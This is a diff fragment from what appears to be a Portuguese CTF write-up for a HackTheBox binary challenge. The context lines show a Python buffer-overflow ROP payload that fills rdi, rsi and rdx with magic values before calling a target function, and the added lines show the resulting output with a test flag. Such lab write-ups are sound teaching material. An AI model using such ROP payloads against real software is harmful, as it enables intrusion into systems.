@@ -25,4 +25,15 @@ fill_ammo_addr = 0x4012f5
 print(b"A"*40 + p64(ret) + p64(pop_rdi) + p64(0xdeadbeef) + p64(pop_rsi) + p64(0xdeadbabe) + p64(pop_rdx) + p64(0xdead1337) + p64(fill_ammo_addr))
 ```
 
+Conseguindo então o seguinte resultado:
 
+---
+
+Preparing beta testing..
+[✓] [✓] [✓]
+
+All Placements are set correctly!
+
+Ready to launch at: HTB{f4k3_fl4g_4_t35t1ng}
+
+---
